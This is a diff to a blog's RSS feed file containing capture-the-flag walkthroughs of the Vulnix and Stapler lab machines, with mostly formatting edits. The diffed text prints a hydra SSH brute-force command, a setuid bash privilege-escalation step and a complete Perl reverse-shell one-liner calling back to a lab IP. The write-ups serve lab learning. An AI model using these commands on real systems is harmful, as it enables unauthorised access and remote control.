@@ -6,8 +6,8 @@
 </description>
     <link>http://a.aronott.com/</link>
     <atom:link href="http://a.aronott.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 29 Jul 2017 20:37:59 -0600</pubDate>
-    <lastBuildDate>Sat, 29 Jul 2017 20:37:59 -0600</lastBuildDate>
+    <pubDate>Sat, 29 Jul 2017 20:45:28 -0600</pubDate>
+    <lastBuildDate>Sat, 29 Jul 2017 20:45:28 -0600</lastBuildDate>
     <generator>Jekyll v3.5.1</generator>
     
       <item>
@@ -170,7 +170,7 @@ Target domain ............
 
 &lt;p&gt;After creating this user and switching, we are able to get into the /mnt/vulnix directory. Here we will create an ssh key that will allow us to ssh directly to the machine using the vulnix user.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mounted_as_vulnix.png&quot; alt=&quot;Mounted as vulnix&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mounted-as-vulnix.png&quot; alt=&quot;Mounted as vulnix&quot; /&gt;&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen -t rsa
 &lt;/code&gt;&lt;/pre&gt;
@@ -218,7 +218,8 @@ chmod 4755 bash
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/escalation_to_root.png&quot; alt=&quot;Escalate&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;BOOM! Done.&lt;/p&gt;
+&lt;p&gt;Technically we are not root, but we have all the permissions of the root user with that EUID
+BOOM! Done.&lt;/p&gt;
 </description>
         <pubDate>Fri, 28 Jul 2017 12:34:00 -0600</pubDate>
         <link>http://a.aronott.com/ctf/vulnix.html</link>
@@ -431,7 +432,9 @@ Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;
 
 &lt;h2 id=&quot;bruteforce&quot;&gt;Bruteforce&lt;/h2&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image14.png&quot; alt=&quot;Bruteforce&quot; /&gt;&lt;/p&gt;
 
@@ -463,7 +466,9 @@ Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;
 
 &lt;p&gt;I added a reverse shell using perl to this script:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;perl -e 'use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image18.png&quot; alt=&quot;reverse shell in script&quot; /&gt;&lt;/p&gt;
 
